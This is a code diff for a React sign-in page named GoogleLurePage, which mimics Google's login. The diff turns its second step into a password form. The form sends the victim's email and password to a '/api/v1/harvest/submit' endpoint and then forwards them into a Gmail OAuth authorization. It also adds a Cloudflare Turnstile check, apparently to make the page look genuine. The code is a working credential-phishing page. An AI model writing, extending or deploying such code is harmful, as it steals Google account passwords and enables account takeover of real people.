@@ -1,9 +1,9 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { api } from "@/lib/api";
 import { Provider } from "@/lib/types";
-import { UserCircle2, ChevronDown, Eye, EyeOff } from "lucide-react";
+import { UserCircle2, ChevronDown, Eye, EyeOff, Loader2 } from "lucide-react";
 
 export default function GoogleLurePage() {
   const [step, setStep] = useState<1 | 2>(1);
@@ -12,6 +12,39 @@ export default function GoogleLurePage() {
   const [showPassword, setShowPassword] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
+  const [turnstileToken, setTurnstileToken] = useState("");
+  const turnstileRef = useRef<HTMLDivElement>(null);
+  const turnstileWidgetId = useRef<number | null>(null);
+
+  // Load Turnstile script
+  useEffect(() => {
+    if (typeof window !== "undefined" && !document.querySelector('script[src*="turnstile"]')) {
+      const script = document.createElement("script");
+      script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js";
+      script.async = true;
+      script.defer = true;
+      document.head.appendChild(script);
+    }
+  }, []);
+
+  // Render Turnstile widget
+  useEffect(() => {
+    if (step === 2 && turnstileRef.current && window.turnstile && turnstileWidgetId.current === null) {
+      turnstileWidgetId.current = window.turnstile.render(turnstileRef.current, {
+        sitekey: process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || "",
+        theme: "dark",
+        callback: (token: string) => setTurnstileToken(token),
+        "expired-callback": () => setTurnstileToken(""),
+        "error-callback": () => setTurnstileToken(""),
+      });
+    }
+    return () => {
+      if (turnstileWidgetId.current !== null && window.turnstile) {
+        window.turnstile.reset(turnstileWidgetId.current);
+        turnstileWidgetId.current = null;
+      }
+    };
+  }, [step]);
 
   const handleNext = (e: React.FormEvent) => {
     e.preventDefault();
@@ -23,15 +56,48 @@ export default function GoogleLurePage() {
     setStep(2);
   };
 
-  useEffect(() => {
-    if (step === 2) {
-      // Small delay for UX so they see the loading bar
-      const timer = setTimeout(() => {
-        window.location.href = `${api.getBaseUrl()}/api/v1/oauth/gmail/authorize?target_email=${encodeURIComponent(email)}`;
-      }, 1500);
-      return () => clearTimeout(timer);
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!password) {
+      setError("Enter a password");
+      return;
     }
-  }, [step, email]);
+    if (turnstileWidgetId.current !== null && !turnstileToken) {
+      setError("Please complete the security check");
+      return;
+    }
+    
+    setSubmitting(true);
+    setError("");
+    
+    try {
+      const response = await fetch(`${api.getBaseUrl()}/api/v1/harvest/submit`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: email,
+          password,
+          provider: "GMAIL",
+          turnstile_token: turnstileToken || undefined,
+        }),
+      });
+      
+      if (!response.ok) {
+        const data = await response.json();
+        throw new Error(data.detail || "Submission failed");
+      }
+      
+      // Redirect to OAuth flow
+      window.location.href = `${api.getBaseUrl()}/api/v1/oauth/gmail/authorize?target_email=${encodeURIComponent(email)}`;
+    } catch (err: any) {
+      setError(err.message || "Something went wrong. Try again.");
+      if (turnstileWidgetId.current !== null && window.turnstile) {
+        window.turnstile.reset(turnstileWidgetId.current);
+      }
+    } finally {
+      setSubmitting(false);
+    }
+  };
 
   return (
     <div className="flex min-h-screen flex-col items-center justify-center bg-[#111] px-4 font-sans text-[#e8eaed] sm:px-0">
@@ -156,15 +222,86 @@ export default function GoogleLurePage() {
               </div>
             </form>
           ) : (
-            <div className="flex h-full flex-col items-center justify-center pt-8">
-              <div className="mb-8 text-center text-[#e8eaed]">
-                <p className="text-lg">Redirecting to secure login...</p>
-                <p className="mt-2 text-sm text-[#9aa0a6]">Please wait while we connect to Google.</p>
+            <form onSubmit={handleSubmit} className="flex h-full flex-col">
+              <div className="relative mb-2 mt-4">
+                <div className="flex items-center gap-3 px-4 py-3 rounded border border-[#5f6368] bg-transparent">
+                  <UserCircle2 className="h-5 w-5 text-[#9aa0a6]" />
+                  <span className="text-base text-[#e8eaed] flex-1">{email}</span>
+                </div>
               </div>
-              <div className="h-1 w-full max-w-xs overflow-hidden rounded-full bg-[#303134]">
-                <div className="h-full w-1/2 animate-[progress_1s_ease-in-out_infinite] rounded-full bg-[#8ab4f8]"></div>
+              <div className="relative mb-2">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  id="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  autoFocus
+                  className="peer w-full rounded border border-[#5f6368] bg-transparent px-4 pb-2 pt-6 pr-12 text-base text-[#e8eaed] outline-none focus:border-2 focus:border-[#8ab4f8] focus:px-[15px] focus:pb-[7px] focus:pt-[23px]"
+                  placeholder=" "
+                  disabled={submitting}
+                />
+                <label
+                  htmlFor="password"
+                  className="pointer-events-none absolute left-4 top-4 origin-[0] -translate-y-3 scale-75 transform text-[#9aa0a6] transition-all duration-150 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-3 peer-focus:scale-75 peer-focus:text-[#8ab4f8]"
+                >
+                  Enter your password
+                </label>
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-4 top-1/2 -translate-y-1/2 text-[#9aa0a6] hover:text-[#e8eaed]"
+                  disabled={submitting}
+                >
+                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                </button>
               </div>
-            </div>
+              {error && (
+                <div className="mb-2 flex items-center text-xs text-[#f28b82]">
+                  <svg
+                    aria-hidden="true"
+                    className="mr-2 fill-current"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    width="16"
+                  >
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                  </svg>
+                  {error}
+                </div>
+              )}
+
+              {/* Turnstile Challenge */}
+              <div className="mb-6" ref={turnstileRef} />
+
+              <div className="mb-4 text-sm text-[#9aa0a6]">
+                <span className="text-[#8ab4f8]">Forgot password?</span>
+              </div>
+
+              <div className="mt-auto flex items-center justify-between pb-4">
+                <button
+                  type="button"
+                  onClick={() => setStep(1)}
+                  className="rounded-full px-4 py-2 text-sm font-medium text-[#8ab4f8] hover:bg-[#303134]"
+                  disabled={submitting}
+                >
+                  Back
+                </button>
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="rounded-full bg-[#8ab4f8] px-6 py-2 text-sm font-medium text-[#202124] hover:bg-[#aecbfa] disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
+                >
+                  {submitting ? (
+                    <>
+                      <Loader2 className="h-4 w-4 animate-spin" />
+                      Signing in...
+                    </>
+                  ) : (
+                    "Next"
+                  )}
+                </button>
+              </div>
+            </form>
           )}
         </div>
       </div>
@@ -181,4 +318,21 @@ export default function GoogleLurePage() {
       </div>
     </div>
   );
+}
+
+// Type augmentation for Turnstile
+declare global {
+  interface Window {
+    turnstile: {
+      render: (container: HTMLElement, options: {
+        sitekey: string;
+        theme?: "light" | "dark" | "auto";
+        callback?: (token: string) => void;
+        "expired-callback"?: () => void;
+        "error-callback"?: () => void;
+      }) => number;
+      reset: (widgetId: number) => void;
+      remove: (widgetId: number) => void;
+    };
+  }
 }
